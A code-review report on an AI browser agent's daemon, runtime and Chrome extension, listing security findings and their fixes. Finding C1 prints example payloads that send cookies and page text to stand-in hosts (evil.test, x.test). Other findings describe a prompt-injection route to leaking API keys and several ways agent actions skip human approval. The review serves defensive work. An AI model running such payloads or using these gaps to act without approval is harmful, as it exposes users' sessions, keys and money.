# Browser engine v2: security and correctness review

- Date: 2026-09-29. Read-only review. No source files were changed.
- Scope:
  - Daemon `feat/sen-browser-v2`: `git diff 76582f0..HEAD`, 4 commits (2c216da, d76346d, ba9ca4b, 7db3d79) in `/Users/benji/Projects/SenClaw/.worktrees/senclaw-browser`.
  - Runtime `sen-browser` main: 7730b94 and 67822c6.
  - Extension `senclaw-extension` `feat/driver-v2`: 6b6a5ea and e3dd99d.
- Method: I read every changed file listed in the brief, plus the call sites they depend on:
  - permission checker and skip flags
  - workflow and background one-shot runners
  - runtime manager proxy
  - UI auth and CORS
- Checks I ran:
  - Extension tests: `npx vitest run` passed, 29/29.
  - A scratch probe of `checkCommand`; the output is under C1.
  - I checked the CDP `Page.reload` parameters against the upstream `Page.pdl`.
- Not run: daemon `cargo test`. Only 4.8 GiB of disk is free, and a rebuild of the test binary was too risky.
- Labels:
  - CONFIRMED: shown by reading the code, and by a probe or protocol check where one is cited.
  - PLAUSIBLE: the code path is confirmed, but the real-world trigger or a browser/hyper behaviour was not exercised.

## Summary

| # | Sev | Finding | Status |
|---|-----|---------|--------|
| C1 | Critical | `Page.reload{scriptToEvaluateOnLoad}` passes both allowlists, which gives arbitrary JS on the person's logged-in tabs | CONFIRMED (probe + CDP spec) |
| H1 | High | `browser_do DIALOG_ACCEPT` is tier Auto, so confirm, prompt and beforeunload dialogs are accepted with no approval | CONFIRMED |
| H2 | High | `KEY_ENTER` can never reach Approve, so Enter-to-send and implicit form submission skip approval | CONFIRMED (policy); per-site impact PLAUSIBLE |
| H3 | High | The risky-word list misses common final-purchase labels ("Place your order", "Complete booking", "Book"); the design's `browser.risk` check is not implemented | CONFIRMED |
| H4 | High | After the runtime restarts, a chat's cached tab id points at another chat's tab (read, act, screenshot) | CONFIRMED (id reuse is deterministic) |
| M1 | Medium | `browser_approve` passes with no prompt in skip-permission sessions (workflow steps, background runs) | CONFIRMED (check ordering); exposure depends on config |
| M2 | Medium | Values in sensitive fields (card, CVV, OTP typed as text) leave the machine through observations; hosted redaction covers page text only | CONFIRMED |
| M3 | Medium | Extension pipe: the idle sweep drops it mid-task; approve and resume never reopen it; `clear_pipe` is not scoped to one pipe, so concurrent opens cascade | CONFIRMED |
| M4 | Medium | `llm-only` backend: no iteration bound when actions fail recoverably | CONFIRMED |
| M5 | Medium | 11 of 26 allowlisted CDP methods are unused; several reach data or hooks the design excludes | CONFIRMED (unused); impact PLAUSIBLE |
| M6 | Medium | A task longer than the 900 s MCP timeout is cancelled with no parked state; the tool says "still running" | PLAUSIBLE |
| M7 | Medium | A shared tab is dropped unless a pipe is already open, and no MCP tool can adopt a shared tab | CONFIRMED |
| M8 | Medium | Unbounded daemon maps: `TASKS`, `APPROVALS`, `SHOWN`, `CHAT_TABS` | CONFIRMED |
| L1–L10 | Low | Cross-chat metadata in `browser_tabs`, resume dead ends, dead `/api/browser/*` proxy, pairing race, cycle-key collisions, loopback navigation, `host_of` parsing, context aliasing, DevTools TCP port, profile length mismatch | see below |

---

## Critical

### C1. `Page.reload` carries a script: arbitrary JS in the person's Chrome (CONFIRMED)

**Where**
- `senclaw-extension/src/lib/allowlist.ts:19` allows `'Page.reload'`.
- `checkCommand` (`allowlist.ts:94-126`) inspects params only for four methods: `callFunctionOn`, `createIsolatedWorld`, `navigate` and `setAutoAttach`.
- `src/lib/relay.ts:208-215` forwards `params` verbatim:
  ```ts
  const result = await this.chrome.debugger.sendCommand(target, method, params ?? {});
  ```
- The runtime's `sen-browser/src/allowlist.rs:15,42-61` has the same gap.
- The runtime never calls `Page.reload`. A grep of `src/` and `scripts/` finds zero call sites.

**Protocol check.** CDP `Page.reload` takes `scriptToEvaluateOnLoad`: "If set, the script will be injected into all frames of the inspected page after reload" (from upstream `pdl/domains/Page.pdl`).

**Probe.** A scratch vitest imported the real `allowlist.ts`:
```
checkCommand('Page.reload', {scriptToEvaluateOnLoad: 'fetch("https://evil.test/?c="+document.cookie)'}) → {"ok": true}
```

**Scenario.** A compromised daemon or runtime sends these frames on `/browser/ext`:
1. `{"ch":"drv","id":1,"t":"open_tab","url":"https://mail.google.com/"}`
2. `{"t":"attach","tab":N}`
3. `{"t":"cdp","tab":N,"method":"Page.reload","params":{"scriptToEvaluateOnLoad":"fetch('https://x.test/',{method:'POST',body:document.body.innerText})"}}`

Chrome then runs the script in the main world of every frame, using the person's session. The same works on any tab the person shared.

This breaks the design's central claim (§9.7): "dù daemon hay runtime bị chiếm quyền, cũng không đọc được cookie hay chạy JS tuỳ ý trên trang đang đăng nhập" ("even if the daemon or runtime is compromised, it cannot read cookies or run arbitrary JS on a logged-in page"). It also breaks risk-register row "Extension có quyền debugger… Cao" ("the extension has the debugger permission… High").

**Fix**
- Remove `Page.reload` from both lists; it has no caller.
- Change `checkCommand` and `allowlist::check` to per-method parameter allowlists that reject unknown keys, so a future CDP parameter cannot reopen this hole.
- Add a test asserting `Page.reload` with `scriptToEvaluateOnLoad` is refused.

---

## High

### H1. `browser_do` accepts confirm, prompt and beforeunload dialogs as Auto (CONFIRMED)

**Where**
- `src/browser_agent/rest.rs:293`:
  ```rust
  let (tier, reason) = policy::risk_tier(&operation, &action, None);
  ```
- `policy.rs:84-87`:
  ```rust
  "DIALOG_ACCEPT" => match dialog_type { Some("alert") | None => (Tier::Auto, …)
  ```
- The runtime offers `dialog_accept` on every dialog observation (`sen-browser/src/observation.rs:74-76`). The encoder turns every non-click/fill/select action into a control named by the uppercased id (`encoder.rs:130`), so `browser_look` lists `DIALOG_ACCEPT`.
- The MCP schema advertises it (`src/mcp/browser_agent_server.rs:70`).
- The runtime answers dialogs with no freshness check (`tab.rs:416`, `448-451`: `Page.handleJavaScriptDialog {accept:true}`).

**Scenario**
1. The agent clicks a trash icon labelled "Trash", which is Auto.
2. The page shows `confirm("Permanently delete 1,240 photos?")`.
3. `browser_look` shows `DIALOG_ACCEPT`.
4. `browser_do {"observation_id":k,"operation":"DIALOG_ACCEPT"}` executes. No approval is requested.

The task loop parks the same dialog for approval (`run.rs:569-580`). This is the S4 trap "dialog confirm → 0 thao tác trái phép" ("confirm dialog → 0 unauthorized actions"). With `beforeunload`, the same call throws away the person's unsaved form.

**Fix**
- In `do_step`, pass `shown["dialog"]["type"]`.
- Make `None` fail closed (Approve) for `DIALOG_ACCEPT`. A `dialog_accept` action only exists while a dialog is open.

### H2. `KEY_ENTER` never reaches Approve (CONFIRMED; per-site impact PLAUSIBLE)

**Where**
- `policy.rs:77-83` checks only `SEARCH_WORDS` and returns Auto or Logged.
- The control is offered for any focused text input, textarea or contenteditable (`scripts/snapshot.js:155-159`) and executes a trusted Enter (`tab.rs:446`, `558-583`).
- It is reachable three ways:
  - `browser_do` (Auto and Logged pass).
  - The loop's LLM tier, whose `encoded_for_llm` is JevFull and includes `KEY_ENTER` (`run.rs:626`, `642`).
  - The hosted and llm-only backends.

**Scenario A (message sent).** In Messenger, Zalo Web or Slack, where Enter sends:
1. `TYPE_TEXT` in "Message" (Logged).
2. `KEY_ENTER` "Press Enter in Message" (Logged).
3. The message is sent with no approval, although "send" and "post" are Approve for clicks.

**Scenario B (implicit submit).** On a checkout or transfer form, Enter in any single-line field triggers implicit submission of the form's submit button ("Place order", "Chuyển tiền" = "Transfer money"). No approval is asked.

**Fix**
- Treat `KEY_ENTER` as a submit. It is Approve unless the field is search-like (role searchbox, or a form with `role=search`).
- Have `snapshot.js` report the focused field's form context (the submit button label, whether it is a textarea or contenteditable) so the policy can apply `RISKY` to that label.

### H3. The risky-word list misses the most common purchase labels; `browser.risk` is missing (CONFIRMED)

**Where.** `policy.rs:27-33` (`RISKY`) and `37-51` (`has_word`, which needs the phrase to be contiguous). `CLICK` is Approve only when a listed word or phrase occurs in the label (`policy.rs:72-75`).

**Examples.** Each of these is Tier::Auto; I checked each against the list:
- "Place your order": Amazon's final button. `"place order"` is not contiguous, and no other word matches.
- "Complete booking".
- "Book": only "book now" is listed.
- "Complete order", and "Submit": only "submit order" is listed.
- "Accept", "Agree", "Apply", "Share", "Comment", "Move to trash", "Archive", "Discard".

**Design gap.** The design's backstop is a model check that can only raise a tier ("browser.risk: noul 'thao tác có không đảo ngược được không?', chỉ được thêm bước duyệt", i.e. "ask whether the action is irreversible; it may only add an approval step"). It is not implemented: `browser.risk` occurs 0 times in `src/`.

**Scenario.** Goal "buy the cheapest USB-C cable on Amazon". The model clicks "Place your order", which is Auto, and the order is placed with no approval.

**Fix**
- Implement `browser.risk` as a raise-only question for CLICK, KEY_ENTER and SELECT on forms that are not search forms.
- Match phrases token-wise (all tokens present, in order, within a small window).
- Add at least: order, book, complete, submit, trash, archive, discard, share, comment, accept, agree.
- Add tests for these real labels.

### H4. After a runtime restart, a chat's tab id resolves to another chat's tab (CONFIRMED)

**Where: the runtime reuses ids.**
- `sen-browser/src/browser.rs:65-67`: `next()` is a per-process counter that starts at 1 and is shared by sessions and tabs. The first session is `s1` and the first tab is always `t2` (`browser.rs:225`).
- Observation ids restart at 1 in each tab (`tab.rs:108`, `345`, `356`).
- The runtime stops after 30 idle minutes (`senclaw-runtime.json:19` `"idleTimeoutSecs": 1800`).

**Where: the daemon never invalidates its caches.**
- `CHAT_TABS` (`run.rs:124-134`, `owner|driver → tab id`) and `SHOWN` (`rest.rs:36-43`, `tab id → observation`) are never cleared.
- `current_tab` (`rest.rs:233-241`) returns `chat_tab(owner)` without checking the tab's owner. The runtime does keep `Tab.owner` (`tab.rs:67`).

**Scenario**
1. Yesterday, chat A (a group chat) used `browser_open`, which gave it `t2`. The runtime then idled out.
2. Today, chat B (the owner's DM) runs `browser_task` with `browser: "extension"` on their bank. The new runtime process creates tab `t2` for owner B.
3. Chat A calls `browser_read`, `browser_look` or `browser_screenshot`. `chat_tab(A)` is `t2`, so B's bank page is returned to chat A.
4. `browser_look` then `browser_do` also act on it.

This violates the design rule "Chỉ thao tác trên tab mà session tự tạo ra" ("only act on tabs the session itself created").

**Aggravating case (PLAUSIBLE).** `SHOWN[t2]` still holds A's old page. If A sends `browser_do` with its old `observation_id` and B's `t2` happens to be at the same per-tab id:
- `do_step` resolves the target and the risk tier on A's old page.
- The runtime then clicks the same action id (for example `e7`) on B's page, and its freshness check passes because it compares against B's own stored observation.

**Fix**
- The runtime issues unguessable tab ids (or includes a process epoch), and enforces `owner` on every `/v1/tabs/:tid` call.
- The daemon drops `CHAT_TABS` and `SHOWN` entries when the runtime epoch changes or the owner does not match.

---

## Medium

### M1. `browser_approve` is released with no prompt in skip-permission sessions (CONFIRMED ordering; exposure depends on config)

**Where**
- `src/zen_core/permissions.rs:493-495` returns true when `skip_mcp` is set. That check runs before the per-call guard at `:496`:
  ```rust
  if self.skip_mcp.load(...) { return Ok(true); }
  if self.is_allowed(name) && !Self::is_per_call_mcp_tool(name) { ... }
  ```
- Workflow agent steps turn on every skip flag: `src/workflow/step_runners.rs:144-145` (`// Unattended: skip all permission prompts` → `SkipPermissions::default()`, all true per `src/agent/isolated_runner.rs:57-66`).
- Workflow steps now get the v2 browser tools (`src/cli/commands/workflow.rs:243-250`; used by the daemon at `src/lib.rs:3191`).
- Background runs also default to all-skip (`src/background/runner.rs:254` `..Default::default()`).

**Scenario**
1. A user persona or background task whitelists `browser_task` and `browser_approve`. Short MCP names resolve.
2. The task parks `needs_approval` on "Place order".
3. The agent calls `browser_approve {approve:true}`.
4. `check()` returns true, and the purchase runs with no person involved.

This is not the user's global accept-all; it is the unattended default. The built-in `browser-agent` persona still lists legacy tool names, so exposure needs a custom whitelist. The unit test `browser_approve_is_confirmed_on_every_call` does not cover skip flags.

**Fix**
- Evaluate `is_per_call_mcp_tool` before any skip flag.
- In sessions with no permission bridge, return false (the action stays parked) instead of true.

### M2. Values of sensitive fields leave the machine (CONFIRMED)

**Where**
- `snapshot.js:108` marks `sensitive`, but `:118-120` still emits `value`. Only password, file and hidden inputs are dropped (`:16`).
- The encoder copies `value` into elements (`encoder.rs:143`) and `current_value` into target options (`:207`).
- `table()` returns elements to the agent (`rest.rs:248-258`).
- Hosted redaction touches only `view["text"]` (`run.rs:600-607`).
- History items keep the typed `text` and are sent in `recent_actions` without redaction.

**Scenario**
1. During a handover on checkout, the person types a card number (`autocomplete=cc-number`, `type=tel`) and a CVV (`cc-csc`, `type=text`).
2. On resume, the next observation carries the value `4111 1111 1111 1111` and the CVV value `123`.
3. Those values go to the local decision model and to the LLM tier. The fallback model defaults to the chat model, often cloud-hosted.
4. They are also in the agent's `browser_look` result.
5. On hosted domains they reach the hosted decision model unredacted. This defeats Tier::Human's purpose ("the person enters it").

**Fix**
- In `snapshot.js`, emit an empty value and `filled:true` for sensitive fields. Keep real values only inside the runtime-internal `guards`.
- For hosted, apply `redact_pii` to element labels and values and to history text.

### M3. Extension pipe lifecycle breaks in-flight and parked extension tasks (CONFIRMED)

**Where**
- `src/browser_agent/extension.rs:263`: `last_used` is refreshed only in `ensure_pipe`.
- `:323-340`: the sweeper drops the pipe after 600 s regardless of traffic or parked approvals.
- `rest.rs:204-223`: `task_resume` and `approval` never call `driver()`, so the pipe is never reopened.
- The runtime's `drop_relay` forgets every tab on that relay (`browser.rs:81-99`). A later `act` gets `not_found`, which is not in the recoverable list (`run.rs:387`), so the task is parked as `error` (`run.rs:406-410`).

**Scenario 1.** An extension `browser_task` runs longer than 10 minutes (for example 40 steps with slow LLM calls, 60 s each). Its pipe is dropped mid-task, its tabs are forgotten, and the task ends in error.

**Scenario 2.** A task parks `needs_approval` ("Transfer"). The person approves after 12 minutes. The action is sent to a forgotten tab and the task becomes "error". The person's tab stays under the debugger (yellow bar), because the extension is never told the relay died.

**Race.** `clear_pipe` (`extension.rs:249-255`) clears whichever pipe is current for `conn_id`, not the pipe whose reader ended (`:301-302`):
1. Two concurrent `ensure_pipe` calls (two chats, or parallel tool calls) both dial the runtime.
2. The runtime's `set_relay` closes relay 1 (`browser.rs:75-79`).
3. The daemon replaces pipe 1 with pipe 2.
4. Pipe 1's reader ends and calls `clear_pipe`, which drops pipe 2.
5. The runtime then drops relay 2, and both tasks lose their tabs.

**Fix**
- Refresh `last_used` on every relayed frame.
- Hold a lease while a task is running or an approval is parked.
- Serialize `ensure_pipe` with a `tokio::Mutex`.
- Scope `clear_pipe` to a pipe generation.
- Call `driver()` in approve and resume.
- Tell the extension when the pipe closes so it detaches its tabs.

### M4. `llm-only` loop has no iteration bound (CONFIRMED)

**Where**
- `run.rs:543`: the loop stops only on `steps >= max_steps || decisions >= max_steps*2`.
- The `LlmOnly` branch (`run.rs:597-599`, `637-642`) never increments `decisions`.
- `execute` returns `Ok` on `stale_page`, `target_covered`, `invalid_target` and `dialog_open` without incrementing `steps` (`run.rs:386-405`).

**Scenario**
1. `decisionBackend: "llm-only"` is set.
2. The page has live-updating text (a ticker or countdown) and a cookie banner covering the target.
3. Each iteration: the act returns `target_covered`, the page is re-observed, and the text has changed, so `cycle_key` is new.
4. The LLM picks the same target again.

The result is one LLM call per iteration with no end, until the HTTP caller disconnects (see M6).

**Fix**
- Count every iteration, or every LLM call, against the budget.
- Park `needs_user` after N consecutive recoverable failures.
- Add a wall-clock cap.

### M5. Unused allowlisted CDP methods widen reach in the person's Chrome (CONFIRMED unused; impact PLAUSIBLE)

**Unused methods.** 11 of the 26 methods in `allowlist.ts:16-43` and `allowlist.rs:12-39` have zero call sites in the runtime:
- `Page.reload` (see C1)
- `Page.startScreencast`, `Page.stopScreencast`, `Page.screencastFrameAck`
- `DOM.getContentQuads`, `DOM.describeNode`, `DOM.resolveNode`, `DOM.getNodesForSubtreeByStyle`
- `Accessibility.getFullAXTree`
- `DOMSnapshot.captureSnapshot`
- `Target.setAutoAttach`

**Why they matter.** The probe accepted each of the following:
- `DOMSnapshot.captureSnapshot` returns `inputValue` for inputs, including `type=password`, which `snapshot.js` deliberately skips.
- `Input.dispatchKeyEvent` accepts any `commands`. `commands:["paste"]` pastes the system clipboard into a page the runtime navigated to, where it can then be read back.
- `Target.setAutoAttach{waitForDebuggerOnStart:true}` pauses new frames and workers, and `Runtime.runIfWaitingForDebugger` is not allowed, so they never resume.
- `Page.navigateToHistoryEntry` can send a shared tab back to a non-http(s) history entry (for example `file:` or `data:`) that `Page.navigate` would refuse.

**Fix**
- Delete the unused methods from both lists.
- Restrict `Input.dispatchKeyEvent.commands` to `selectAll`.
- In the extension, validate the target entry's URL before `navigateToHistoryEntry`.

### M6. Tasks longer than the MCP timeout are cancelled and lost (PLAUSIBLE)

**Where**
- `browser_agent_server.rs:19` sets `TASK_TIMEOUT = 900 s`.
- On timeout it tells the agent "still running … check back with browser_tabs rather than starting it again" (`:162-165`).
- The loop runs inside the request future (`rest.rs:200`). Axum/hyper drop that future when the client disconnects, so the loop stops at an arbitrary await, possibly right after an act, without calling `park()`.
- `browser_tabs` does not list tasks.
- The same applies to `browser_approve`: the approved action runs, the continuation is cut, and the agent is told it is still running.

**Fix.** Run tasks as spawned jobs with a registry. Return or park on timeout, and expose task status.

### M7. Shared tabs are lost, and agents cannot adopt them (CONFIRMED)

**Where**
- The side panel's `shareTab` sends `shared_tab` once (`relay.ts:283-300`).
- `forward_to_runtime` drops the frame when `conn.pipe` is `None` (`extension.rs:240-247`). The pipe opens only in `ensure_pipe`, for a task.
- The runtime's shared list starts empty for each relay (`relay.rs:47`).
- MCP `TaskParams` has no `ext_tab` (`browser_agent_server.rs:22-43`). Only REST `/tasks` accepts it.

**Scenario**
1. The person shares a tab, then asks the agent to work on it.
2. No pipe was open, so the runtime never learned about the share.
3. `adopt_shared` fails with "the person has not shared tab N" (`browser.rs:254-257`). The agent has no parameter for it anyway.

**Fix**
- The daemon keeps each connection's shared-tab list and replays it after the runtime hello.
- Add shared-tab selection to `browser_task`.

### M8. Unbounded daemon state (CONFIRMED)

**Where**
- Every outcome other than done (budget, blocked, error, unverified, needs_*) is parked into `TASKS`/`APPROVALS` (`run.rs:121-122`, `317-335`). Entries are removed only by resume or approve. Each one holds the full observation, history, steps and text cache.
- `SHOWN` (`rest.rs:36-43`) keeps a full observation per tab and is never evicted.
- `CHAT_TABS` grows by one entry per owner.

**Fix.** Add a TTL and a size cap, and clear these maps when the runtime epoch changes.

---

## Low

**L1. `browser_tabs` leaks other chats' tabs and pairing codes (CONFIRMED).**
- `rest.rs:390-399` returns the runtime's `/v1/sessions`, which lists every tab with its owner JID and URL (`browser.rs:34-41`, `tab.rs:671-680`).
- It also returns `hub().status()`, which includes pending pairing codes (`extension.rs:142-147`).
- Example: a group-chat agent sees the owner's DM tab URL (a password-reset link or a mail-thread URL) and phone-number JID.
- Fix: filter by caller owner, and show pairing codes only on the UI endpoint.

**L2. `browser_resume` cannot continue `budget` or `needs_input` (CONFIRMED).**
- `resume` keeps `stats` (`run.rs:254-261`), so `drive` re-parks "budget" at once (`run.rs:543-545`).
- For `needs_input` there is no way to pass the missing value: `ResumeParams` has only `task_id`, and `/tasks/:id/resume` takes no body.

**L3. The `/api/browser/*` read-only proxy can never succeed (CONFIRMED).**
- `core.rs:665` mounts the route, and `proxy.rs:116,123` forwards `/api/browser/<rest>` verbatim.
- `sen-browser` serves only `/v1/*` (`http.rs:24-39`), so every call returns 404.
- Each call still starts the runtime (`forward` → `ensure_slot_started`).
- Fix: strip the prefix for this slot.

**L4. The pairing approval race can install a dead connection (PLAUSIBLE).**
- `approve_code` removes the pending entry under the lock, then writes the file and calls `register()` without it (`extension.rs:183-208`).
- If the socket closes in that window, `unregister` (`:232-238`) finds nothing to remove. `register` then installs a dead `Conn` and sends `replaced` to the healthy extension.
- On `replaced`, the extension sets `held=true` and stops reconnecting (`connection.ts:170-175`).
- `is_connected()` stays true, and extension tasks time out.

**L5. `cycle_key` ignores which element was clicked (PLAUSIBLE).**
- The key is `(unfocused fingerprint, operation, label, text)` (`run.rs:171-176`), with no node or action id.
- Example: after GO_BACK to an identical results list, "Select" on a different flight is judged "Going in circles", and the LLM's repeat ends the task as blocked (`run.rs:757-761`).

**L6. Browser tools can open the daemon's own loopback API (PLAUSIBLE).**
- `check_url` allows `http://127.0.0.1` (`tab.rs:683-691`, test at `:700`).
- In `auto` mode, loopback peers (the browsers) are trusted (`ui_server/auth.rs:401-412`).
- Scenario: prompt injection makes the agent call `browser_open http://127.0.0.1:18788/api/llm-config`, then `browser_read` returns the provider keys, then `browser_do TYPE_TEXT` puts them into the attacker's form.
- MCP tools are commonly always-allowed, so this path skips the Bash prompt.
- Fix: refuse the daemon's and runtime's own ports.

**L7. `host_of` does not follow the WHATWG URL rules (CONFIRMED).**
- In `policy.rs:112-115`, `https://evil.test\@mail.google.com/` yields `mail.google.com`. The real host is `evil.test`, because browsers treat `\` as a path separator.
- A `domainDrivers{"mail.google.com":"extension"}` rule then routes an evil.test page into the person's Chrome.
- Fix: use `url::Url`.

**L8. Isolated-world tracking depends on the runtime enabling Runtime (PLAUSIBLE).**
- In `relay.ts:229-240`, contexts are removed only on `Runtime.executionContextDestroyed` or `executionContextsCleared`.
- Chrome sends those events only if the runtime enabled the Runtime domain, and CDP documents that context ids can be reused across processes.
- So a runtime that skips `Runtime.enable` can make a stale isolated-world id alias a new document's main world.
- Fix: clear contexts on a main-frame `Page.frameNavigated`, or have the extension itself enable Runtime on attach.

**L9. The managed Chrome exposes a TCP DevTools port (hardening).**
- `chrome.rs:113-114` launches with `--remote-debugging-port=0`.
- Any local process, including an agent's Bash, can read `DevToolsActivePort` and call `Network.getAllCookies` or `Runtime.evaluate` on the managed profile.
- That profile holds sign-ins completed during handover, and this path bypasses the allowlist and the risk tiers.
- Fix: use `--remote-debugging-pipe`.

**L10. Profile-name limits disagree (CONFIRMED).**
- Daemon: `settings.rs:108` accepts up to 64 characters.
- Runtime: `chrome.rs:75-77` accepts up to 40.
- A profile name of 41-64 characters saves fine, and then every task fails with `bad_request`.

---

## Accepted residual risks (not re-reported)

- **Loopback REST is unauthenticated in `auto` mode.** Consequences specific to this feature:
  - Any local process, or any Chrome extension with loopback host permission, can pair itself. It already receives its own code in `pair_required`, and `POST /api/browser-agent/extension/pairings/:code/approve` needs no body.
  - After pairing it can replace the live connection.
  - Any such caller can answer `/approvals/:id`.
  - Cheap hardening: pin the allowed extension IDs (Web Store and dev) in `origin_extension_id`.
- **Global accept-all or bypass permissions.**
- **Legacy WS routes.** `/browser` and `/browser-mcp` stay mounted with no Origin check (`gateway.rs:188-205`), which `extension.rs:8-9` itself describes as takeover-able. Consider unmounting them when engine v2 is active.

## Checked and holding (for risk calibration)

**Pairing and connection trust**
- `/browser/ext` checks Origin before the upgrade and requires a 32-character a–p extension id.
- `hello.ext` must equal the Origin id, and the first frame must be the hello within 10 s.
- The token is 256-bit random, stored only as SHA-256 in a 0600 file, and bound to the extension id.
- The pairing code is 8 symbols from a 32-symbol alphabet (about 40 bits), expires after 10 minutes, works once, and is pruned when its socket disconnects.

**Unpaired connections**
- `forward_to_runtime` requires the live connection's id, so an unpaired connection cannot reach the runtime.
- The extension ignores `drv` frames until connected, and detaches all tabs whenever it is not connected.

**Extension enforcement (apart from C1 and M5)**
- Only tabs SenClaw opened or the person shared can be driven.
- `open_tab` and `Page.navigate` are limited to http(s) and `about:blank`.
- `callFunctionOn` needs an approved script hash and a SenClaw isolated context; `objectId` targets are refused.
- `grantUniveralAccess` is refused.

**Runtime and approval**
- The runtime consumes the observation before sending input, so a request cannot be replayed.
- The runtime refuses to fill sensitive fields, and never observes password fields.
- Saved grants for `browser_approve` are ignored, and its prompt shows the pending action.
- Traces are metadata only: `record_decision` carries the operation, index and confidence; the two `tracing::warn!` calls carry no page content.

## Test gaps

- Daemon: none of these paths has a test:
  - `approve`, `resume`, `park` with a pending action, `describe_approval`
  - the dialog rule tier
  - `do_step` tiers (DIALOG_ACCEPT, KEY_ENTER)
  - the llm-only bound
  - pipe idle and concurrency
  - skip flags together with `browser_approve`
- Extension: the allowlist tests do not cover parameters of methods that have no special case (see C1 and M5).

## Plan and design follow-ups (for the lead; I did not edit the plan)

- The `browser.risk` raise-only model check (design §9) is not implemented.
- "tab rảnh 30 phút thì bị đóng" ("idle tabs are closed after 30 minutes") is not implemented in the runtime or the extension.
- The S4 acceptance bar ("0 thao tác trái phép", i.e. zero unauthorized actions, including confirm dialogs) is not met, because of H1, H2 and H3.
- The rule "Chỉ thao tác trên tab mà session tự tạo ra" ("only act on tabs the session created") is violated by H4.

## Recommended actions (in priority order)

1. C1: remove `Page.reload` and the other unused methods from both allowlists; move to per-method parameter allowlists; add regression tests.
2. H1: make `DIALOG_ACCEPT` fail closed in `do_step`.
3. H2 and H3: treat `KEY_ENTER` as a submit, widen word coverage with token matching, and implement `browser.risk`.
4. H4: use owner-checked, unguessable tab ids, and invalidate `CHAT_TABS`/`SHOWN` when the runtime epoch changes.
5. M1: evaluate per-call tools before skip flags, and deny them when there is no bridge.
6. M2: blank sensitive values in `snapshot.js`; redact elements and history for hosted.
7. M3 and M7: add a pipe lease, generation-scoped `clear_pipe` and serialized `ensure_pipe`; make approve/resume reopen the pipe; replay shared tabs.
8. M4, M6 and M8: add iteration and wall-clock bounds, a spawned task registry, and TTL caches.

## Unresolved questions

- M6 depends on hyper dropping the handler future when the client disconnects. I did not exercise it.
- M5 depends on two Chrome behaviours I did not test live: whether `DOMSnapshot` returns password `inputValue`, and whether `commands:["paste"]` works through chrome.debugger.
- Should group or channel chats be able to use `browser: "extension"` at all? `select_driver` has no per-chat gate, which widens H4 and L1.
- Does sen-sysone's default model for the verification request (`model: None`) differ from the acting model? If not, the DONE check is not independent.

---

## Resolution (2026-09-29, after the review)

Fixed by the implementer; the review above is kept as written. Each fix has a regression test, listed as an acceptance
check (`acceptance.py`, checks S1–S9 and E3).

| # | Fix | Where (commit) | Test |
|---|-----|----------------|------|
| C1, M5 | Per-method **parameter** allowlists in both runtime and extension; the 11 unused methods removed; `commands` only `["selectAll"]`; `navigateToHistoryEntry` checks the target entry is http(s) | sen-browser 372779a, extension e9d9ecc | S1; X2 |
| H1 | `DIALOG_ACCEPT`: only an `alert` is Auto; confirm/prompt/beforeunload and an unknown type need the person, in the loop and in `browser_do` (dialog type from the observation the step names) | senclaw aafd840 | S2 |
| H2 | `KEY_ENTER` judged by what it submits: search box Auto, multi-line Approve, a form whose submit label is risky Approve, no form Approve (runtime reports `multiline`/`search`/`submit`) | sen-browser fd28872, senclaw aafd840 | S2 |
| H3 | Token-wise risky phrases (EN + VI, up to 2 words between: "Place **your** order", "Complete booking", "Book", "Submit", "Share", …) and the design's raise-only `browser.risk` check: the decision model may add a pause on an Auto/Logged click or Enter (p ≥ 0.7), never remove one; also for `browser_do` | senclaw aafd840 | S2, S3 |
| H4 | Runtime ids carry a per-process epoch (`t<epoch>-<n>`); every tab-addressed REST call checks the runtime's owner for the calling chat and forgets a stale id | sen-browser fd28872, senclaw aafd840 | S4 |
| M1 | `browser_approve` is checked before any skip flag; a session that asks nobody gets a refusal and the action stays paused — for the person in Settings → Browser (web, desktop) via `GET /api/browser-agent/approvals` | senclaw 2733669 | S5 |
| M2 | Sensitive fields observed as `value: ""` + `filled: true`; hosted decisions get redacted elements, labels and history | sen-browser fd28872 (test 7539992), senclaw aafd840 | R2 (a prefilled one-time code comes back only as `filled`) |
| M3 | Pipe generations (a late reader never closes a newer pipe), `ensure_pipe` serialised, traffic both ways counts as use, the idle sweep skips while a task runs or has paused there within 30 min, approve/resume reopen the pipe, and the extension is told `pipe_closed` so it releases every tab | senclaw aafd840, extension 4434ed1 | S6; X4 |
| M4 | Every pass counts against the budget, 5 recoverable failures in a row park `needs_user`, a 14-minute wall clock parks `budget` | senclaw aafd840, 312760d | S8 |
| M6 | Partly: the loop parks at 14 minutes, before the 15-minute MCP timeout, so the agent gets a resumable task instead of a cancelled one | senclaw aafd840 | — |
| M7 | The daemon keeps the person's shares per connection and replays them to every new pipe; a withdrawn or closed share is dropped by extension, daemon and runtime; `browser_task` takes `shared_tab` | senclaw aafd840, sen-browser 9556287, extension 4434ed1 | S6, S9 |
| M8 | Caps: 100 parked tasks (oldest evicted), 512 chat tabs, 256 shown observations | senclaw aafd840 | — |
| L1 | A chat's `browser_tabs` lists only its own tabs; pairing codes only on the settings endpoint | senclaw aafd840 | S4 |
| L2 | Resume measures the budget from where the task paused | senclaw aafd840 | — |
| L3 | `/api/browser/*` strips its namespace for sen-browser (`/v1/*`) | senclaw 8576572 | S7 |
| L4 | Pairing approval runs under one lock and refuses a closed socket, so a dead connection never replaces a live one | senclaw aafd840 | S6 |
| L5 | The cycle key includes the element (id, node) | senclaw aafd840 | — |
| L6 | The daemon's own UI and WS ports are refused as pages (open, task start, look, read, screenshot, the loop) | senclaw aafd840 | S4 |
| L7 | `host_of` uses a WHATWG URL parser | senclaw aafd840 | S2 (policy tests) |
| L8 | The extension drops its isolated-world contexts on a main-frame navigation | extension e9d9ecc | X3 |
| L10 | Daemon profile names limited to 40, like the runtime | senclaw aafd840 | — |

Not fixed, follow-ups:

- **L9**: the managed Chrome still exposes a TCP DevTools port; move to `--remote-debugging-pipe`.
- **M6** in full: a spawned task registry with status, so a task outlives the HTTP call that started it (also for an
  approval answered from Settings → Browser and then closed mid-way).
- **L2** for `needs_input`: `browser_resume` cannot pass the missing value yet.
- Idle tabs are not closed after 30 minutes (design follow-up).
